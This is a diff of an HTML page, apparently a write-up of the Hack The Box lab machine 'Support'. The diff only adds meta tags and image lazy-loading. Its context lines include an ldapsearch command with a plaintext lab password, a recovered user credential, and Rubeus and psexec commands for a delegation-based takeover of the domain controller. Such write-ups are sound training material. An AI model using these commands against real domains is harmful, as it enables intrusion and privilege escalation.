@@ -3,6 +3,18 @@
 <head>
     <meta charset="utf-8">
     <title>HTB: Support | HackWithJordan</title>
+    <!-- site-meta -->
+    <meta name="description" content="Walkthrough of the Hack The Box machine Support, from first foothold to full compromise.">
+    <link rel="canonical" href="https://hackwithjordan.com/posts/2024-11-25-Support(HTB).html">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="HackWithJordan">
+    <meta property="og:title" content="HTB: Support">
+    <meta property="og:description" content="Walkthrough of the Hack The Box machine Support, from first foothold to full compromise.">
+    <meta property="og:url" content="https://hackwithjordan.com/posts/2024-11-25-Support(HTB).html">
+    <meta property="og:image" content="https://hackwithjordan.com/assets/room/poster.jpg">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta property="article:published_time" content="2024-11-25">
+    <!-- /site-meta -->
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <link rel="stylesheet" href="../assets/css/syntax.css">
     <style>
@@ -318,13 +330,13 @@
 
         <p>I actually got stuck here as the password does not work for armando. I looked up a hint and this password is for the ldap user…?</p>
 
-        <img alt="Screenshot 2" height="283" src="../img/posts/2024-11-25-Support(HTB)/02-00daa6ab3d.png" style="aspect-ratio:1233/283;" width="1233"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 2" height="283" src="../img/posts/2024-11-25-Support(HTB)/02-00daa6ab3d.png" style="aspect-ratio:1233/283;" width="1233"/>
 
         <p>Finding supports password</p>
 
         <pre class="terminal"><code>ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"| grep -C 30 "sAMAccountName: support"</code></pre>
 
-        <img alt="Screenshot 3" height="590" src="../img/posts/2024-11-25-Support(HTB)/03-94f9807b6d.png" style="aspect-ratio:1281/590;" width="1281"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 3" height="590" src="../img/posts/2024-11-25-Support(HTB)/03-94f9807b6d.png" style="aspect-ratio:1281/590;" width="1281"/>
 
         <p>support:Ironside47pleasure40Watchful</p>
 
@@ -332,9 +344,9 @@
 
         <p>Support has generic all over the domain controller</p>
 
-        <img alt="Screenshot 4" height="296" src="../img/posts/2024-11-25-Support(HTB)/04-f1afca2489.png" style="aspect-ratio:238/296;" width="238"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 4" height="296" src="../img/posts/2024-11-25-Support(HTB)/04-f1afca2489.png" style="aspect-ratio:238/296;" width="238"/>
 
-        <img alt="Screenshot 5" height="480" src="../img/posts/2024-11-25-Support(HTB)/05-2eb0b965aa.png" style="aspect-ratio:576/480;" width="576"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 5" height="480" src="../img/posts/2024-11-25-Support(HTB)/05-2eb0b965aa.png" style="aspect-ratio:576/480;" width="576"/>
 
         <p>Following bloodhound we can exploit this.</p>
 
@@ -351,7 +363,7 @@ Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoacto
 
 .\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/DC.support.htb /ptt</code></pre>
 
-        <img alt="Screenshot 6" height="532" src="../img/posts/2024-11-25-Support(HTB)/06-68e8ce18d8.png" style="aspect-ratio:904/532;" width="904"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 6" height="532" src="../img/posts/2024-11-25-Support(HTB)/06-68e8ce18d8.png" style="aspect-ratio:904/532;" width="904"/>
 
         <p>We copy the ticket and then decode it using base64</p>
 
@@ -369,7 +381,7 @@ Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoacto
 
         <pre class="terminal"><code>impacket-psexec -k support.htb/administrator@dc.support.htb -no-pass</code></pre>
 
-        <img alt="Screenshot 7" height="250" src="../img/posts/2024-11-25-Support(HTB)/07-ca68feb388.png" style="aspect-ratio:678/250;" width="678"/>
+        <img loading="lazy" decoding="async" alt="Screenshot 7" height="250" src="../img/posts/2024-11-25-Support(HTB)/07-ca68feb388.png" style="aspect-ratio:678/250;" width="678"/>
     </article>
 
 <script>
